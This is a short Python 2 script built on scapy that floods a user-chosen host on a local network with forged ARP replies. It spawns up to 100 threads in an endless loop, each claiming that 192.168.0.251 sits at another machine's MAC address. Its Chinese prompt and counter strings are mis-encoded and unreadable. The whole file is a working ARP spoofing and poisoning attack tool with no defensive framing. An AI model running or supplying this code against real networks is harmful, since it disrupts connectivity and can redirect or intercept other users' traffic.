#coding=utf-8
from scapy.all import *
from threading import Thread,Lock,activeCount

BROADCASTMAC = getmacbyip('192.168.0.120')

class Loop(Thread):
    def __init__(self,ip):
        Thread.__init__(self)
        self.ip = ip
        
    def run(self):
        global BROADCASTMAC
        arp = ARP()
        arp.psrc = '192.168.0.251'
        arp.hwsrc = BROADCASTMAC
        arp.pdst = self.ip
        arp.op = 2
        sr1(arp,verbose = 0,retry = 0,timeout = 3)

class Main(Thread):
    def __init__(self,ip):
        Thread.__init__(self)
        self.ip = ip

    def run(self):
        limit = 100
        total = 0
        while True:
            if activeCount() < limit:
                Loop(self.ip).start()
                total = total + 1
            print 'Ŀǰ�ѽ�����ARP�����Ĵ���Ϊ:'+str(total)
            
if __name__ == '__main__':
    ip = raw_input('������Ҫ����ARP�����Ļ���IP:')
    
    Main(ip = ip).start()
    